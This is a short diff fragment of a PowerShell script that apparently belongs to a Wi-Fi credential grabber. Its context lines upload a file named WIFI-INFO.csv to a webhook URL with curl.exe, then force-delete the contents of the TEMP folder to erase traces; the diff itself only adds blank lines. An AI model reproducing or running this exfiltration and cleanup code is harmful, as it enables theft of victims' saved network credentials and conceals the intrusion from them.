@@ -46,3 +46,6 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 Upload-Discord -file $env:TMP\WIFI-INFO.csv
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+
+
